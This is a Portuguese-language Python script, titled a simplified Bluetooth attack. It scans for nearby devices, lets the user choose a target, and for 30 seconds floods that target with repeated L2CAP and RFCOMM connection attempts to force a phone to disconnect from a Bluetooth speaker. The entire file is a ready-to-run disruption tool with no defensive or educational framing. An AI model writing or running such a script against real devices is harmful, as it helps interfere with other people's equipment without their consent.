#!/usr/bin/env python3
"""
Script Simplificado - Ataque Bluetooth
Versão fácil de usar para desconectar caixa de som
"""

import bluetooth
import sys
import time

def main():
    print("=" * 60)
    print("    ATAQUE BLUETOOTH SIMPLIFICADO")
    print("=" * 60)
    print()
    
    # Passo 1: Escanear dispositivos
    print("[*] Passo 1: Escaneando dispositivos Bluetooth...")
    print("[*] Certifique-se de que a caixa de som está em modo pareamento\n")
    
    try:
        devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True)
        
        if not devices:
            print("[-] Nenhum dispositivo encontrado!")
            print("[!] Verifique se:")
            print("    - Bluetooth está ativado")
            print("    - Dispositivos estão próximos")
            print("    - Caixa está em modo pareamento")
            return
        
        print(f"[+] {len(devices)} dispositivo(s) encontrado(s):\n")
        
        # Listar dispositivos
        device_list = []
        for i, (addr, name) in enumerate(devices, 1):
            print(f"[{i}] {name or 'Sem nome'}")
            print(f"    MAC: {addr}\n")
            device_list.append((addr, name))
        
        # Passo 2: Selecionar dispositivo
        print("\n" + "=" * 60)
        choice = input("Digite o número do dispositivo alvo (ou MAC diretamente): ").strip()
        
        target_mac = None
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(device_list):
                target_mac = device_list[idx][0]
                print(f"[+] Alvo selecionado: {device_list[idx][1]} ({target_mac})")
            else:
                print("[!] Número inválido!")
                return
        else:
            # Tentar usar como MAC
            target_mac = choice.upper().replace('-', ':')
            if len(target_mac) != 17 or target_mac.count(':') != 5:
                print("[!] MAC inválido!")
                return
            print(f"[+] MAC informado: {target_mac}")
        
        # Passo 3: Executar ataque
        print("\n" + "=" * 60)
        print("[*] Passo 3: Iniciando ataque...")
        print("[*] Pressione Ctrl+C para parar\n")
        
        duration = 30
        start_time = time.time()
        attempt = 0
        
        try:
            while time.time() - start_time < duration:
                attempt += 1
                
                # Tentar múltiplos métodos
                try:
                    # Método 1: L2CAP
                    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
                    sock.settimeout(0.5)
                    sock.connect((target_mac, 0x1001))
                    sock.close()
                except:
                    pass
                
                try:
                    # Método 2: RFCOMM
                    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                    sock.settimeout(0.5)
                    sock.connect((target_mac, 1))
                    sock.close()
                except:
                    pass
                
                if attempt % 10 == 0:
                    print(f"[*] {attempt} tentativas...")
                
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print("\n[!] Ataque interrompido")
        
        print(f"\n[+] Ataque concluído: {attempt} tentativas")
        print("[+] Verifique se o celular desconectou da caixa de som")
        
    except KeyboardInterrupt:
        print("\n\n[!] Operação cancelada pelo usuário")
    except Exception as e:
        print(f"\n[!] Erro: {e}")
        print("[!] Certifique-se de que:")
        print("    1. Bluetooth está instalado: sudo apt install bluez python3-bluez")
        print("    2. Adaptador está funcionando: hciconfig")
        print("    3. Você tem permissões adequadas")

if __name__ == "__main__":
    main()

